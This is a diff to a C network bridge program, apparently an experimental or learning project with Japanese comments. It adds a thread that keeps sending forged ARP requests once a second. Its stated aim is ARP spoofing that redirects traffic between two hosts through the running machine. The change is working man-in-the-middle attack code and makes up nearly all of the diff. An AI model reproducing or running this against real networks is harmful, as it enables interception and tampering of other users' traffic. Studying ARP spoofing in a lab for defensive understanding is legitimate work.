@@ -11,7 +11,9 @@
 #include    <sys/ioctl.h>
 #include    <linux/if.h>
 #include    <netinet/ip.h>
+#include    <pthread.h>
 #include	"netutil.h"
+#include <unistd.h>
 
 uint8_t bytes[6];
 
@@ -442,6 +444,27 @@ char *my_inet_ntoa_r(struct in_addr *addr,char *buf,socklen_t size)
 }
 //--------------
 
+//スレッド関係---
+struct argArp{
+    int soc;
+    in_addr_t ip_d;
+    in_addr_t ip_s;
+    u_char mac_d[6];
+    u_char mac_s[6];
+};
+
+void *arpspoof(void *p){
+    struct argArp  *arg = (struct argArp *)p;
+    while(1){
+        SendArpRequestB(arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
+        usleep(1*1000000);    
+    }
+
+    return (NULL);
+}
+
+//---
+
 int main(int argc,char *argv[],char *envp[])
 {
     char    buf[80];
@@ -485,6 +508,13 @@ int main(int argc,char *argv[],char *envp[])
     signal(SIGTTOU,SIG_IGN);
     
     DebugPrintf("bridge start\n");
+    
+    pthread_t arpTid;
+    pthread_t bridgeTid;    
+    pthread_attr_t  attr;
+    
+    pthread_attr_init(&attr);
+
     //---ARPスプーフィング
     static  u_char    bcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};    //ブロードキャストMACアドレス
     char    *in_addr_text_sender = Param.ip_A;                     //ARPスプーフィング先A
@@ -494,15 +524,29 @@ int main(int argc,char *argv[],char *envp[])
     
     inet_aton(in_addr_text_sender, &sendIp);
     inet_aton(in_addr_text_receiver, &recIp);
+
+    //スレッド用引数の準備
+    struct argArp arg_arpspoof;
+    arg_arpspoof.soc = Device[0].soc;
+    arg_arpspoof.ip_d = sendIp.s_addr;
+    arg_arpspoof.ip_s = recIp.s_addr;
+    //MACaddrのコピー
+    memcpy(arg_arpspoof.mac_d, bcast, 6);
+    memcpy(arg_arpspoof.mac_s, Device[0].hwaddr, 6);
+    
+    int status;
+    if((status=pthread_create(&arpTid,&attr, arpspoof, &arg_arpspoof))!=0){
+        DebugPrintf("pthread_create:%s\n",strerror(status));
+    }
     
     //DebugPrintf("NextRouter=%s\n",my_inet_ntoa_r(&NextRouter,buf,sizeof(buf)));
     
     //SendArpRequestB(Device[0].soc, recIp.s_addr, bcast, Device[0].addr.s_addr, Device[0].hwaddr);
     //sendIp→recIpの通信をこちらに回すARPスプーフィング。相手のIPアドレスに、こちらは端末BのIPアドレス、かつ自分のMACアドレスを入れてリクエストを送る
-    int     i=0;
-    for(i=0; i<100; i++){
-        SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
-    }
+    //int     i=0;
+    //for(i=0; i<100; i++){
+    //    SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
+    //}
     
     //TODO:あとでPARAMSに移動
     //static  u_char    mac_A[6]={0x68,0x05,0xCA,0x06,0xF6,0x7B};   //端末AのMACアドレス(desk-h)
@@ -517,6 +561,8 @@ int main(int argc,char *argv[],char *envp[])
     //Bridge();
     //---ブリッジここまで
     DebugPrintf("bridge end\n");
+
+    pthread_join(arpTid,NULL);
     
     close(Device[0].soc);
     close(Device[1].soc);
